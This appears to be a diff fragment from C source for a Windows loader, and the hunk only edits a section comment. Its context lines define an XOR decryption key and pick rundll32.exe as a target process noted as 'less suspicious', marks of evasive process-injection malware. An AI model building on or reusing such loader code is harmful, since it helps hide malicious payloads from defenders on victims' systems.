@@ -671,7 +671,7 @@ const BYTE g_XorKey = 0xAB;          // XOR decryption key
 // Target process (less suspicious)
 const char* g_TargetProcess = "C:\\Windows\\System32\\rundll32.exe";
 
-// ========== PE HELPER FUNCTIONS (unchanged from original) ==========
+// ========== PE HELPER FUNCTIONS ==========
 BOOL IsValidPE(LPVOID pImage) {
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
     if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
